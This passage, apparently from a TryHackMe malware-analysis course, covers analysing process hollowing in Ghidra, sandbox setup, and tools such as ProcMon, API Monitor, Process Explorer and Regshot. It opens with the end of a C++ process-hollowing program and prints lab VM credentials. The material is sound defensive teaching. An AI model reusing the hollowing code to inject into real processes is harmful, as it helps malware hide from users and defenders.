    if (!SetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

int main()
{
    char* szSourceProcessName = "C:\\\\Windows\\\\System32\\\\calc.exe";
    char* szTargetProcessName = "notepad.exe";

    if (HollowProcess(szSourceProcessName, szTargetProcessName))
    {
        cout << "Process hollowing successful" << endl;
    }
    else
    {
        cout << "Process hollowing failed" << endl;
    }

    return 0;
}
```

**Analyzing Process Hollowing**

Now that we understand what process hollowing is and how we can use the Ghidra
 disassembler to analyze the malware to get a better understanding of 
the ins and outs of it, let’s create a new project and load the 
Benign.exe sample that is located on the Desktop into Ghidra.

An
 important point to note is that almost all malware comes packed with 
known or custom packers and also have employed different Anti-debugging /
 VM 
detection techniques to hinder the analysis. This topic will be covered 
in the next room. The sample is not packed in this task, and no 
Anti-debugging / VM detection technique is applied.

Our objective of advanced static analysis would be to:

- Examine the API calls to find a pattern or suspicious call.
- Look at the suspicious strings.
- Find interesting or malicious functions.
- Examine the disassembled/decompiled code to find as much information as possible.

Let's begin the analysis.

**Load the Sample:** Load the program; it will show the summary as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/23cb7630645de4ffa08c33ab62356ea0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/23cb7630645de4ffa08c33ab62356ea0.png)

**Analyze:** Let Ghidra analyze the sample.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0a744d5cbed645b8de22c0872efb582b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0a744d5cbed645b8de22c0872efb582b.png)

Ghidra
 does not automatically land at the start of the program. It's up to us 
to pick which function we want to analyze first. We will start looking 
at the Windows APIs used to accomplish process hollowing.

**Note:**
 It's important to mention that starting to search for the 
CreateProcessA function right away is not how an analyst would start 
analyzing an unknown binary.

# CreateProcess

We
 learned in the previous task that in process hollowing, the suspicious 
process creates a victim process in the suspended state. To confirm, 
let's search for the `CreateProcessA` API in the Symbol Tree section. Then, right-click on the `Show References to` option to display all the program sections where this function is called.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/8fa4dfa56dc48c298209eabe8e9bdfa0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/8fa4dfa56dc48c298209eabe8e9bdfa0.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f7d90c1e105a4b0e5906b1768a00d67.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/5f7d90c1e105a4b0e5906b1768a00d67.png)

Clicking on the first reference will take us to the disassembled code and show the decompiled C code in the Decompile section.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a128471d7f022eab2ad3d78dc08b913c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a128471d7f022eab2ad3d78dc08b913c.png)

It clearly shows how the parameters on the stack are being pushed in reverse order before calling the function. The value `0x4` in the [process creation flag](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) is being pushed into the stack, representing the suspended state.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1fb01debad5d05ad08f3e84889000a81.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/1fb01debad5d05ad08f3e84889000a81.png)

# Graph View

Clicking on the **Display Function Graph** in the toolbar will show the graph view of the disassembled code we are examining.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/72ed0c7a08de545195403621dac05411.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/72ed0c7a08de545195403621dac05411.png)

In the above case, if the program:

- Fails to create a victim process in the suspended state, it will move to block 1. The `red arrow` represents the failure to meet the condition mentioned above.
- Successfully creates the victim process, it will move to block 2. The `green arrow` represents the success of the jump condition.

# Open Suspicious File

The [CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) API is used to either create or open an existing file. Let's search for this API call in the Symbol Tree section and go to the code where it is referencing to.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e70072a69662db2d73e502fd5f7d82e2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/e70072a69662db2d73e502fd5f7d82e2.png)

# Hollow the Process

Malware use `ZwUnmapViewOfSection` or `NtUnmapViewOfSection` API calls to unmap the target process's memory. Let's search for both and see if either API is called.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73581248f62e8778becab5ab669d925a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73581248f62e8778becab5ab669d925a.png)

`NtUnmapViewOfSection`
 takes exactly two arguments, the base address (virtual address) to be 
unmapped and the handle to the process that needs to be hollowed.

# Allocate Memory

Once the process is hollowed, malware must allocate the memory using [VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) before writing the process. Let's find instances of VirtualAllocEx API
 calls in the same way. Arguments passed to the function include a 
handle to the process, address to be allocated, size, allocation type, 
and memory protection flag.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4d386a49c2ce6297dbf0dce79ad5bc2b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/4d386a49c2ce6297dbf0dce79ad5bc2b.png)

# Write Down the Memory

Once
 the memory is allocated, the malware will attempt to write the 
suspicious process/code into the memory of the hollowed process. The [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API is used for this purpose. Let's locate the function and analyze the code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a3036f1fc16a5e9cc12177fcbc0a395d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a3036f1fc16a5e9cc12177fcbc0a395d.png)

There were three calls to the `WriteProcessMemory` Function. The last call references to the code in the Kernel32 DLL;
 therefore, we can ignore that. From the decompiled code, it seems the 
program is copying different sections of the suspicious process one by 
one.

# Resume thread

Once
 all is sorted out, the malware will get hold of the thread using the 
SetThreadContext and then resume the thread using the ResumeThread API to execute the code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ae784a683a2d91112d923f6e22ae6b8f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ae784a683a2d91112d923f6e22ae6b8f.png)

Here, we can see how the program sets the thread context and then resumes it to execute the malicious code.

## **BASIC DYNAMIC ANALYSIS**

**Sandboxing**

In
 all the malware analysis rooms, it has been emphasized that malware 
should only be analyzed in a controlled environment, ideally a virtual 
machine. However, this becomes increasingly important for the dynamic 
analysis of malware. The primary concern regarding performing static 
analysis on malware in a live environment is an accidental execution, 
but we intentionally execute malware in a dynamic analysis scenario. 
This makes it all the more important to ensure that malware is analyzed 
in a sandboxed environment.

So what is required to create a sandbox?

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/24535d0457a795c29cc32edaf44ced1b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/24535d0457a795c29cc32edaf44ced1b.png)

Broadly, the following setup will be required to create a sandbox:

- An isolated machine, ideally a virtual machine, that is not connected to
live or production systems and is dedicated to malware analysis.
- The ability of the isolated or virtual machine to save its initial clean
state and revert to that state once malware analysis is complete. This
functionality is often called creating and reverting a snapshot. We will need to revert to the original clean state before analyzing a new
malware so that infection from the previous malware doesn't contaminate
the analysis of the next one.
- Monitoring tools that help us
analyze the malware while it's executing inside the Virtual Machine.
These tools can be automated, as we see in automated sandboxes, or they
can be manual, requiring the analyst to interact while performing
analysis. We will learn about some of these tools later in the room.
- A file-sharing mechanism that can be used to introduce the malware into
the Virtual Machine and sends the analysis data or reports out to us.
Often, shared directories or network drives are used for this purpose.
However, we must be careful that the shared directory is unmounted when
executing the malware, as the malware might infect all the files. This
is especially true of ransomware, which might encrypt all shared drives
or directories.

In the [Intro to Malware Analysis](https://tryhackme.com/room/intromalwareanalysis)
 room, we learned about some automated sandboxes to help perform dynamic
 analysis. Below, we will learn about some tools to help create our 
sandbox, which gives us more analysis control. So let's start.

## Virtualization:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ce309ec857c03b41ed52b2e7ca0082b6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/ce309ec857c03b41ed52b2e7ca0082b6.png)

A
 lot of commercial and free tools are available for virtualization. Some
 of the most famous ones include Oracle's VirtualBox and VMware's Player
 and Workstation. These three tools allow us to create Virtual Machines 
isolated from our local machine. However, VMWare Player can't create 
snapshots. For dynamic analysis of malware, snapshot creation is a 
critical requirement, which makes VMWare Player unsuitable for malware 
analysis. VMWare Workstation and VirtualBox have the snapshot creation 
option and are, therefore, suitable for malware analysis. VirtualBox is 
free, but VMWare Workstation has a paid license.

Apart from these,
 server-based virtualization software like XenServer, QEmu, ESXi, etc., 
help with virtualization on a dedicated server. This type of setup is 
often used by enterprises for their virtualization needs. Security 
research organizations often use similar technologies to create a VM farm for large-scale virtualization.

For
 the scope of this room, we will be skipping the step of creating a VM 
and installing an OS in it. Please note that the VM's OS needs to be the
 same as the malware's target OS for dynamic analysis. In most scenarios, this will be the Windows OS. We will be covering tools related to Windows OS in this room.

## Analysis Tools:

Once
 we have a VM with the OS installed, we need to have some analysis tools
 on the VM. Automated malware analysis systems have some built-in tools 
that analyze malware behaviour. For example, in Cuckoo's sandbox, 
cuckoomon is a tool that records malware activity in a Cuckoo sandbox 
setup. In the coming tasks, we will learn about some tools to perform 
manual dynamic analysis of malware. Once we have our required tools 
installed on the VM and before running any malware on the VM, we must take a snapshot. After analysis of every malware, we must revert the VM to this snapshot, which will hold the clean state of the VM. This will ensure that our analysis is not contaminated by different malware samples running simultaneously.

## File-sharing:

Different platforms provide different options for sharing files between host and guest OS. In the most popular tools, i.e., Oracle VirtualBox or VMWare Workstation, the following options are common:

- Shared folder.
- Creating an iso in the host and mounting it to the VM.
- Clipboard copy and paste.

Apart
 from these, there are other, less common options, for example, running a
 web server on the guest where malware samples can be uploaded or 
mounting a removable drive to the Virtual Machine. Please note that the 
more isolated the option to share files, the safer it will be for the 
host OS. Apart from sharing malware with the VM, the file-sharing option is also used to extract analysis reports from the VM.

Once we have created a VM,
 set up analysis tools, taken a snapshot, and placed the malware inside 
our sandbox, we can start analysing our malware. In the next task, we 
will learn about tools to help us.

**ProcMon**

In
 this task, we will learn how to use Process Monitor, or ProcMon, to 
analyze malware's activities. ProcMon is part of the Sysinternals suite,
 a set of utilities created by a company named Winternals Software and 
purchased by Microsoft in 2006. Sysinternals consists of many handy 
utilities that provide advanced functionalities for Windows. 
Sysinternals utilities are widely used in Security research, and we will
 cover some of them in this room and from time to time in other rooms as
 well. So let's start with ProcMon.

Before moving forward, please start the attached VM. The VM will open in split view. Alternatively, you can use the following credentials to log into the machine:

**Username:** Administrator

**Password:** Passw0rd!

Once
 the machine has started, navigate to the following location to start 
ProcMon. Desktop > Tools > Utilities > procmon.exe. Once 
ProcMon is launched, the following window will appear.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/d68fcc5a2b8ddc94efa9c41a253199b1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/d68fcc5a2b8ddc94efa9c41a253199b1.png)

The controls of ProcMon are self-explanatory, and a brief description
 is shown if we hover over one of the controls. The labels in the 
screenshot show some of the critical controls of the data visible below 
these controls.

1. Shows the Open and Save options. These
options are for opening a file that contains ProcMon events or saving
the events to a supported file.
2. Shows the Clear option. This
option clears all the events currently being shown by ProcMon. It is
good to clear the events once we execute a malware sample of interest to reduce noise.
3. Shows the Filter option, which gives us further control over the events shown in the ProcMon window.
4. These are toggles to turn off or on Registry, FileSystem, Network, Process/Thread, and Profiling events.

Below these controls, we can see from left to right the Time, Process, Process ID (PID),
 Event Name, Path, Result and Details of the activity. We can observe 
that events are shown in chronological order. Generally, ProcMon will 
show an overwhelming number of events occurring on the system. For ease 
of analysis, it is wise to filter the events to those of our interest.

## Filtering Events:

ProcMon allows easy filtering of events from the events window itself. For example, check out the below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2bdba005965a8312f515e3eed9c0a13d.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/2bdba005965a8312f515e3eed9c0a13d.png)

If we right-click on the process column on the process of our choice,
 a pop-up menu opens up. We can see different options in the pop-up 
menu. Some of these options are related to filtering. For example, if we
 choose the option `Include 'Explorer.EXE'`, ProcMon will only show events with Process Name Explorer.EXE. If we choose the option `Exclude 'Explorer.EXE'`,
 it will exclude Explorer.EXE from the results. Similarly, we can 
right-click on other columns of the events window to filter other 
options.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fcb3b83250d934a6cd3ca4023d601f59.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/fcb3b83250d934a6cd3ca4023d601f59.png)

As seen in the screenshot above, when we right-click on an event, we 
can filter in/out an event. Similarly, we can add more filters to the 
results until we narrow down the results to the events of our interest. 
If we choose the `Include 'Explorer.EXE'` and `Include 'CreateFile'` events, ProcMon will only show us CreateFile events triggered by Explorer.EXE.

### Advanced Filtering:

ProcMon also allows us to implement 
advanced filters. In the menu marked as number 3 in the first image in 
this task, we can see the option for filtering. When we click on this 
option, we see the following window pop up.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bb3539459c7cdea4bf8319794ea81b46.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/bb3539459c7cdea4bf8319794ea81b46.png)

We can see some preset filters already applied in ProcMon, like the 
one for filtering out Procmon.exe. We can see that the filter process is
 quite simple to implement. We select filtering values, like Process 
Name, its relation, value, and action. If the checkbox is ticked, the 
filter is applied. Otherwise, the filter is ignored. We can see that the
 first two filters are not applied in this screenshot. The third filter 
states that if Process Name is Procmon.exe, then Exclude that event from
 reporting. Therefore, we don't see any events related to Procmon.exe. 
Here, it must be noted that an 'include' filter will show events related
 to only that entity. For example, if we include Explorer.EXE, only 
events with Process Name Explorer.EXE will be shown, and the rest will 
be filtered out.

## Process Tree:

ProcMon also allows us to view all the existing processes in a 
parent-child relationship, forming a process tree. This can be done by 
clicking the

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3776c0a79531b73f07e959fba7c4ac32.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/3776c0a79531b73f07e959fba7c4ac32.png)

icon
 in the menu. This option helps identify the parents and children of 
different processes. As shown by ProcMon, an example process tree can be
 seen below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1a120f37386d0462c4199c79e68861c3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1a120f37386d0462c4199c79e68861c3.png)

Although a Process Tree is a good piece of information when analysing
 malware, we will look at it in detail when we explore ProcExp later in 
the room.

**API logger and API monitor**

Before starting this task, restart the VM attached to the previous task.

The
 Windows OS abstracts the hardware and provides an Application 
Programmable Interface (API) for performing all tasks. For example, 
there is an API for creating files, an API for creating processes, an 
API for creating and deleting registries and so on. Therefore, one way 
to identify malware behaviour is to monitor which APIs a malware calls. 
The names of the APIs are generally self-explanatory. However, [Microsoft Documentation](https://learn.microsoft.com/en-us/windows/win32/api/) can be referred to for finding information about the APIs.

In this task, we will learn about API logger and API monitor tools which can help us identify what API calls malware is making.

## API Logger:

The API Logger is a simple tool that provides basic information about
 APIs called by a process. We can start  API Logger in the attached VM by navigating to the path `~Desktop\Tools\Utilities\ApiLogger.exe`. When we open the API logger tool, we see the following interface.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b8c5504b70ef398736972a47e465f2ae.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b8c5504b70ef398736972a47e465f2ae.png)

Click to Enlarge

To open a new process, we can click the highlighted three-dot menu. 
When clicked, a file browser allows us to select the executable for 
which we want to monitor the API calls. Once we select the executable, 
we can click 'Inject & Log' to start the API logging process. We will see the log of API calls in the lower pane, as seen in the picture below. In the upper pane, we see the running processes and their PIDs.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1d7ec7aa8d4121475cf61b59a6ed5c99.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/1d7ec7aa8d4121475cf61b59a6ed5c99.png)

Click to Enlarge

We can see the PID of the process we monitor and the API called with basic information about the API in the 'msg' field.

We can click the 'PID' menu for the API logger to log API calls of a running process. It will open the following window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/817ff0f2891fd3276a52fd7c459e7316.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/817ff0f2891fd3276a52fd7c459e7316.png)

Click to Enlarge

This Window shows processes with PIDs, the User that ran that 
process, and the image path of the process. The rest of the process is 
the same as the case with starting our process.

## API Monitor:

The API Monitor provides more advanced information about a process's API calls. API Monitor has 32-bit and 64-bit versions for 32-bit and 64-bit processes, respectively. We can launch API Monitor by navigating to the path `~Desktop\Tools\Utilities\apimonitor-x64.exe` or `~Desktop\Tools\Utilities\apimonitor-x86.exe`. When we open API Monitor, we see the following Window.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2b13cae000fe24eea459a7758341d5c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2b13cae000fe24eea459a7758341d5c.png)

Click to Enlarge

As we can see, API Monitor has multiple tabs, as numbered in the image above.

1. This tab is a filter for the API group we want to monitor. For example, we
have a group for 'Graphics and Gaming' related APIs, another for
'Internet' related APIs and so on. API Monitor will only show us APIs from the group we select from this menu.
2. This tab shows the processes being monitored for API calls. We can click the 'Monitor New Process' option to start monitoring a new process.
3. This tab shows the API call, the Module, the Thread, Time, Return Value, and any errors. We can monitor this tab for APIs called by a process.
4. This tab shows running processes that API Monitor can monitor.
5. This tab shows the Parameters of the API call, including the values of those Parameters before and after the API calls.
6. This tab shows the Hex buffer of the selected value.
7. This tab shows the Call Stack of the process.
8. Finally, this tab shows the Output.

To
 understand it better, let's open a process in API Monitor. When we 
click the 'Monitor New Process' option in Tab 2, we see the following 
option.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/66e36db9380dead7ee8ea44a42241ebd.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/66e36db9380dead7ee8ea44a42241ebd.png)

Click to Enlarge

In this menu, we can select the Process from a path, any arguments 
the process takes, the directory from where we want to start the 
process, and the method for attaching API Monitor. We can ignore the 
'Arguments' and 'Start in' options if we don't have any arguments for 
the process and want to start it from the path where it is already 
located in. Once we open a process, we see the tabs populate as seen in 
the following image.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b824655f97abc330292ab99a58cbadbe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/b824655f97abc330292ab99a58cbadbe.png)

Click to Enlarge

In the above image, we can see all the tabs being populated.

- In Tab 1, we see that we have selected all values so that we can monitor all the API calls.
- In Tab 2, we see the path of the process we are monitoring.
- In Tab 3, we see a summary of the API calls. The highlighted API call can
be seen as RegOpenKeyExW. Hence we know that the process tried to open a registry key. We see that the API call returns an error, which we can
see in the 'Return Value' field of this tab, and the error details can
be found in this tab's 'Error' field.
- Tab 5 shows the parameters of the API call from before and after the API call was made.
- Tab 6 shows the selected value in Hex.
- Tab 7 shows the Call Stack of the process.

We see that API Monitor provides us with much more information about 
API calls by a process than API Logger. However, we must slow down the 
analysis process to digest all this information. When analyzing malware,
 we can decide whether to use API Logger or API Monitor based on our 
needs. Please head to the [Introduction to Windows API room](https://tryhackme.com/room/windowsapi) to learn more about API calls.

**Process Explorer**

Process
 Explorer is another very useful tool from the Sysinternals Suite. It 
can be considered a more advanced form of the Windows Task Manager. 
Process Explorer is a very powerful tool that can help us identify 
process hollowing and masquerading techniques. We can open the Process 
Explorer tool by navigating to `~Desktop\Tools\Utilities\procexp.exe`.  When we open Process Explorer, we see something like the below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2cbeda8cd451ac878d83df5a6bd571c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/c2cbeda8cd451ac878d83df5a6bd571c.png)

The
 above screenshot shows all the different processes running in the 
system in a tree format. We can also see their CPU utilization, memory 
usage, Process IDs (PIDs), Description, and Company name. We can enable 
the lower pane view from the 'View' menu to find more information about 
the processes. When enabled, we see the following screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/95ec69358edda3ca402c3beb6956cada.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/95ec69358edda3ca402c3beb6956cada.png)

When
 we select a process in the upper pane, we can see details about that 
process in the lower pane. Here, we see the Handles the process has 
opened for different Sections, Processes, Threads, Files, Mutexes, and 
Semaphores. Handles inform us about the resources being used in this 
process. If another process or a thread in another process is opened by a
 process, it can indicate code injection into that process. Similarly, 
we can see DLLs and Threads of the process in the other tabs of the 
lower pane.

For some more details about a selected process, we 
can look at the properties of the process. We can do that by 
right-clicking the process name in the process tree and selecting 
'Properties'. When we open the properties of a process, we see something
 like the below image.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/dc08f14fd0f4d771314dc8ba8a2c83eb.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/dc08f14fd0f4d771314dc8ba8a2c83eb.png)

## Process Masquerading:

As seen in the above screenshot, the properties function shows us a 
lot of information about a process in its different tabs. Malware 
authors sometimes use process names similar to Windows processes or 
commonly used software to hide from an analyst's prying eyes. The 
'Image' tab, as shown in the above screenshot, helps an analyst defeat 
this technique. By clicking the 'Verify' button on this tab, an analyst 
can identify if the executable for the running process is signed by the 
relevant organization, which will be Microsoft in the case of Windows 
binaries. In this particular screenshot, we can see that the Verify 
option has already been clicked. Furthermore, we can see the text '(No 
signature was present in the subject) Microsoft Corporation' at the top.
 This means that although the executable claims to be from Microsoft, it
 is not digitally signed by Microsoft and is masquerading as a Microsoft
 process. This can be an indication of a malicious process.

We 
must note here that this verification process only applies to the Image 
of the process stored on the disk. If a signed process has been hollowed
 and its code has been replaced with malicious code in the memory, we 
might still get a verified signature for that process. To identify 
hollowed processes, we have to look somewhere else.

## Process Hollowing:

Another technique used by malware to hide in plain sight is Process 
Hollowing. In this technique, the malware binary hollows an already 
running legitimate process by removing all its code from its memory and 
injecting malicious code in place of the legitimate code. This way, 
while an analyst sees a legitimate process, that process runs malicious 
code of the malware author. Process Explorer can help us identify this 
technique as well. When we open the 'Strings' tab in a process's 
properties, we see something like the below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6a7279fcf4280543f174b243068a1f33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/6a7279fcf4280543f174b243068a1f33.png)

At
 the bottom of the screenshot, we can see the options 'Image' and 
'Memory'. When we select 'Image', Process Explorer shows us strings 
present in the disk image of the process. When 'Memory' is selected, 
Process Explorer extracts strings from the process's memory. In normal 
circumstances, the strings in the Image of a process will be similar to 
those in the Memory as the same process is loaded in the memory. 
However, if a  process has been hollowed, we will see a significant 
difference between the strings in the Image and the process's memory. 
Hence showing us that the process loaded in the memory is vastly 
different from the process stored on the disk.

**Regshot**

Before starting this task, please terminate the VM and restart it for a fresh start from the snapshot.

Regshot is a tool that identifies any changes to the registry (or the
 file system we select). It can be used to identify what registry keys 
were created, deleted, or modified during our dynamic analysis by 
malware. Regshot works by taking snapshots of the registry before and 
after the execution of malware and then comparing the two snapshots to 
identify the differences between the two. To execute Regshot in the 
attached VM, navigate to `~Desktop\Tools\Utilities\Regshot-x64-Unicode.exe`

When we execute Regshot, we see the following interface. Please note that the Output path we see in the attached VM might differ.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/644a13977824a0e0f353d091b843bd7b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/644a13977824a0e0f353d091b843bd7b.png)

In this simple interface, if we select the Scan dir1 option, we can 
also scan for changes to the file system. However, for the sake of 
brevity, we will only cover registry changes in this room. To start, we 
can click on the '1st shot' option. It will ask us whether to take a 
shot or take a shot and save. Once the 1st shot is taken, we see 
something like the below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5ee571e5ca07e6f7f6d36b00a43e272e.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/5ee571e5ca07e6f7f6d36b00a43e272e.png)

Now that we have saved a shot of the registry, we can execute the 
malware. Once we have executed the malware and are confident that it has
 performed its malicious activity, we take a 2nd shot. For this, we 
click the '2nd shot' option.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/04a3f029d2e4ba76240e5c5272883e21.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/04a3f029d2e4ba76240e5c5272883e21.png)

Now that we have both shots, we can compare them to identify the 
registry changes performed by the malware. We do that by clicking the 
'Compare' option. We will see a summary that looks something like the 
below screenshot.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/44dd0dc6ae8f1dc2e699e1d9abaaf2b9.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/44dd0dc6ae8f1dc2e699e1d9abaaf2b9.png)

Notice that it shows Keys and Values that were added, deleted, and 
modified. It also shows changes to Files and Folders. We see zero 
changes to Folders and Files because we had disabled 'Scan dir1' while 
taking the shots. If we had enabled this option and provided directories
 to monitor, we would have seen details about filesystem changes made by
 the malware in our selected directories. For now, let's move on to the 
results of our execution. If we save the results by clicking on Compare 
> Output, Regshot provides us with the changes in the registry, as 
shown in the screenshot below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/add764fdb38e4b50852bc7733682bb33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/add764fdb38e4b50852bc7733682bb33.png)

Here we see the Date and time of the shots taken by Regshot, the 
computer name, the Username, and the version of Regshot. Below that, we 
can see a list of changes that were made to the registry, starting from 
Keys deleted.>

One advantage that Regshot enjoys over all the other tools discussed 
in this room is that it does not need to be running when we execute the 
malware. Some malware can check all the running processes and shut down 
if any analysis tool is running. When analyzing, we might often 
encounter malware samples that check for ProcExp, ProcMon, or API
 Monitor before performing any malicious activity and quitting if these 
processes are found. Therefore, these samples might thwart our analysis 
efforts. However, since Regshot takes a shot before and after the 
execution of the malware sample, it does not need to be running during 
malware execution, making it immune to this technique of detection 
evasion. On the flip side, we must ensure that no other process is 
running in the background while performing analysis with Regshot, as 
there is no filtering mechanism in Regshot, as we saw in the other 
tools. Hence, any noise created by background processes will also be 
recorded by Regshot, resulting in False Positives.

## **DYNAMIC ANALYSIS:DEBUGGING**

**The Need for Advanced Dynamic Analysis**

Analyzing
 malware is like a cat-and-mouse game. Malware analysts keep devising 
new techniques to analyse malware, while malware authors devise new 
techniques to evade detection. This task will review some techniques 
that hamper our efforts to analyse malware using static or basic dynamic
 analysis.

## Evasion of Static Analysis:

In the static analysis rooms, we learned techniques to perform static
 analysis on malware. Malware often hides or tries to look like 
legitimate software to evade the prying eyes of a malware analyst. 
Because we are not executing the malware during static analysis, the 
main focus of evading static analysis is to obfuscate the true 
functionality of the program until the program is executed. The 
following techniques can be commonly used to achieve this.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61492ae128e1b18ee8455380cb9c229c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/61492ae128e1b18ee8455380cb9c229c.png)

- **Changing the hash:** We have learned previously that every file has a unique hash. Malware
authors exploit this functionality by slightly changing their malware.
This way, the malware's hash changes, bypassing the hash-based detection mechanism. Hashes can change even if one bit of the malware is changed
(unless we are talking Context-Triggered Piecewise Hashes or fuzzy
hashes), so just adding a NOP instruction or other such change can defeat the hash-based detection techniques.
